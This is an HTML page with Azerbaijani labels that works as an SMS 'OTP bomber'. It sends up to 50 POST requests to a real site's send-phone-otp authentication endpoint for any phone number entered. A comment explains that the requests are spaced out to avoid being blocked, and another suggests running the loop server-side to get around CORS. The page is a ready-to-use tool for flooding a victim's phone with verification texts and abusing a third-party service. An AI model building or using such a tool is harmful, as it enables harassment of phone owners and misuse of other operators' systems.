<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Göndərici</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            width: 300px;
        }
        h2 {
            font-size: 18px;
            margin-bottom: 15px;
            color: #333;
        }
        label {
            font-size: 14px;
            color: #666;
            display: block;
            margin-bottom: 5px;
        }
        input {
            width: 100%;
            padding: 8px;
            margin-bottom: 12px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        button:hover {
            background-color: #0056b3;
        }
        #status {
            margin-top: 10px;
            font-size: 13px;
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>OTP Göndərmə Paneli</h2>
        <label for="phone">Telefon Nömrəsi:</label>
        <input type="text" id="phone" placeholder="Məs: 501234567">

        <label for="count">Say (Neçə dəfə):</label>
        <input type="number" id="count" value="1" min="1" max="50">

        <button onclick="startSending()">Göndər</button>
        <div id="status"></div>
    </div>

    <script>
        async function startSending() {
            const phone = document.getElementById('phone').value.trim();
            const count = parseInt(document.getElementById('count').value);
            const statusDiv = document.getElementById('status');

            if (!phone) {
                statusDiv.style.color = 'red';
                statusDiv.innerText = 'Zəhmət olmasa nömrə daxil edin!';
                return;
            }

            statusDiv.style.color = 'blue';
            statusDiv.innerText = 'Göndərilir...';

            let successCount = 0;

            for (let i = 0; i < count; i++) {
                try {
                    // Qeyd: Brauzerlər arası CORS məhdudiyyətinə görə bu sorğu 
                    // birbaşa client-side (frontend) işləməyə bilər və server 
                    // tərəfdən (məsələn, Python ilə) icra olunması tələb oluna bilər.
                    let response = await fetch('https://www.masin.az/api/auth/send-phone-otp', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({ phone: phone })
                    });

                    if (response.ok) {
                        successCount++;
                    }
                } catch (error) {
                    console.error('Xəta:', error);
                }

                // Sorğular arası kiçik gözləmə (server tərəfindən bloklanmamaq üçün)
                await new Promise(resolve => setTimeout(resolve, 1000));
            }

            statusDiv.style.color = 'green';
            statusDiv.innerText = `Tamamlandı! Uğurlu: ${successCount}/${count}`;
        }
    </script>

</body>
</html>
